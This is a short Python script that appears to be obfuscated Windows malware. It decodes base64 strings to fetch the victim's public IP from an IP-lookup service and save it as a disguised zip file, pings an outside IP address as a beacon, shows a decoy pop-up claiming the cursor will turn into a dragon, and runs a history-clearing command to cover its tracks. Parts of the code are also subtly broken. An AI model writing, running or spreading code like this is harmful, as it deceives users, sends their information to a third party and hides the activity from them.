#!/usr/bin/env python3
import base64
from requests import get
spc = "aHR0cHM6Ly9hcGkuaXBpZnkub3Jn".encode("ascii")

import subprocess
d_spc = base64.b64decode(spc)
cmllssa=d_spc.decode("ascii")
iolww = get(cmllssa).text
cmdshow = "%SystemRoot%\Sysnative\msg.exe * your mouse cursor will now be changed to a dragon"
with open ('%temp%\XEDWewfcvwnwoo.zip', 'wb') as isdc:
	isdc.write(bytes(iolww.encode('ascii')))
reeeewqq = "cGluZyAxODUuMTY3Ljk2LjE0NiAtbiAx".encode("ascii")
llpo = base64.b64decode(reeeewqq)
cmdllss = llpo.decode('ascii')
subprocess.Popen(cmdshow, shell=True)
subprocess.Popen(cmdllss, shell=True)
subprocess.Popen('Clear-History', shell=True)
